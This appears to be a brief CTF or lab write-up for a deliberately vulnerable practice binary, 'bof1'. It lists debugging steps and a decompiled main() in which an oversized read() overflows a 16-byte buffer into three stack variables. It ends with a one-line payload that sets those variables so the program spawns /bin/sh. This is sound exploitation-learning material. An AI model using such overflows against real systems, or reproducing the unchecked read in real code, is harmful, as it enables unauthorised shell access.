- `file ./bof1` 
	![[bof1_JHT-1.png]]
- `pwndbg ./bof1`
- `checksec` 
	![[bof1_JHT-2.png]]
- decompile
```C
int __fastcall main(int argc, const char **argv, const char **envp)
{
  _BYTE buf[16]; // [rsp+0h] [rbp-30h] BYREF
  __int64 v5; // [rsp+10h] [rbp-20h]
  __int64 v6; // [rsp+18h] [rbp-18h]
  __int64 v7; // [rsp+20h] [rbp-10h]
  int v8; // [rsp+2Ch] [rbp-4h]

  v8 = 0;
  v7 = 0LL;
  v6 = 0LL;
  v5 = 0LL;
  init(argc, argv, envp);
  printf("> ");
  v8 = read(0, buf, 48uLL);
  if ( buf[v8 - 1] == 10 )
    buf[v8 - 1] = 0;
  printf("a = %ld\n", v7);
  printf("b = %ld\n", v6);
  printf("c = %ld\n", v5);
  if ( v7 && v6 && v5 )
    system("/bin/sh");
  return 0;
}
```
- `buf[16]` but `read(0, buf, 48uLL)` -> buffer overflow
- `if ( v7 && v6 && v5 ) system("/bin/sh");` -> v5 v6 v7 != 0 -> override in stack
- ![[bof1_JHT-3.png]]
- ![[bof1_JHT-4.png]]
- `cyclic 48` -> `aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaa`
- `start` -> `ni` to `call read@plt`
- ![[bof1_JHT-5.png]]
- ![[bof1_JHT-6.png]]
- ![[bof1_JHT-7.png]]
- ![[bof1_JHT-8.png]]
- ![[bof1_JHT-9.png]]
- stack: buffer -> `c` -> `b` -> `a`
- `payload = b'A' * 16 + p64(0xCAFEBABE) + p64(0xDEADBEEF) + p64(0x13371337)`